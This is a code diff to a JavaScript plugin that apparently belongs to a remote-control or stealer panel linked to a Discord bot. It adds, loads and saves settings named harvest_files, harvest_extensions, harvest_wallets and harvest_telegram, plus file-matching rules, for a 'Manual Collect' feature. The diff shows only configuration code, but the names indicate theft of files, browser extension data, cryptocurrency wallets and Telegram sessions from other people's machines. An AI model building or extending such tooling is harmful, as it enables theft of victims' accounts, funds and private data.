@@ -312,6 +312,12 @@ let pluginSettings = {
   discord_bot_token: "",
   discord_forum_channel_id: "",
   discord_thread_prefix: "Stuart",
+  /** Manual Collect extras (never auto-run on connect). */
+  harvest_files: false,
+  harvest_extensions: false,
+  harvest_wallets: false,
+  harvest_telegram: false,
+  harvest_file_rules: [],
 };
 
 /**
@@ -427,6 +433,18 @@ function loadSettings(db) {
       else if (r.key === 'discord_bot_token') pluginSettings.discord_bot_token = String(r.value || '');
       else if (r.key === 'discord_forum_channel_id') pluginSettings.discord_forum_channel_id = String(r.value || '').replace(/\D/g, '');
       else if (r.key === 'discord_thread_prefix') pluginSettings.discord_thread_prefix = String(r.value || 'Stuart').slice(0, 80);
+      else if (r.key === 'harvest_files') pluginSettings.harvest_files = r.value === '1';
+      else if (r.key === 'harvest_extensions') pluginSettings.harvest_extensions = r.value === '1';
+      else if (r.key === 'harvest_wallets') pluginSettings.harvest_wallets = r.value === '1';
+      else if (r.key === 'harvest_telegram') pluginSettings.harvest_telegram = r.value === '1';
+      else if (r.key === 'harvest_file_rules') {
+        try {
+          const parsed = JSON.parse(r.value || '[]');
+          pluginSettings.harvest_file_rules = Array.isArray(parsed) ? parsed : [];
+        } catch {
+          pluginSettings.harvest_file_rules = [];
+        }
+      }
     }
   } catch (_) {}
 }
@@ -4030,6 +4048,14 @@ export default {
       }
       if (params.discord_thread_prefix !== undefined) {
         upsert.run('discord_thread_prefix', String(params.discord_thread_prefix || "Stuart").slice(0, 80));
+      }
+      if (params.harvest_files !== undefined) upsert.run('harvest_files', params.harvest_files ? '1' : '0');
+      if (params.harvest_extensions !== undefined) upsert.run('harvest_extensions', params.harvest_extensions ? '1' : '0');
+      if (params.harvest_wallets !== undefined) upsert.run('harvest_wallets', params.harvest_wallets ? '1' : '0');
+      if (params.harvest_telegram !== undefined) upsert.run('harvest_telegram', params.harvest_telegram ? '1' : '0');
+      if (params.harvest_file_rules !== undefined) {
+        const rules = Array.isArray(params.harvest_file_rules) ? params.harvest_file_rules : [];
+        upsert.run('harvest_file_rules', JSON.stringify(rules));
       }
       loadSettings(ctx.db);
       pluginCtx = ctx;
